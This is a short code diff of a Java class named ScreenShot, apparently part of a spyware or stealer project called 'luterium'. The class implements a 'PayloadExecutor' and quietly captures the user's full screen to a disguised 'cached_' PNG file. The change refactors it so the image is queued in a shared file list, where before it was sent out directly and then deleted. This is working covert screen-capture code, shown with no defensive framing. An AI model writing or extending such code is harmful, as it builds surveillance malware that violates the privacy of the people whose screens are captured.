@@ -1,6 +1,5 @@
 package dev.peter.luterium.features;
 
-import dev.peter.luterium.Main;
 import dev.peter.luterium.payload.PayloadExecutor;
 
 import javax.imageio.ImageIO;
@@ -9,9 +8,9 @@ import java.awt.image.BufferedImage;
 import java.io.File;
 import java.util.Random;
 
-public class ScreenShot implements PayloadExecutor {
-    Main main = new Main();
+import static dev.peter.luterium.Main.fileList;
 
+public class ScreenShot implements PayloadExecutor {
     @Override
     public void execute() throws Exception {
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
@@ -21,7 +20,6 @@ public class ScreenShot implements PayloadExecutor {
         int random = new Random().nextInt();
         File file = new File("cached_" + random + ".png");
         ImageIO.write(image, "png", file);
-        main.theThing.send(file);
-        file.delete();
+        fileList.add(file);
     }
 }
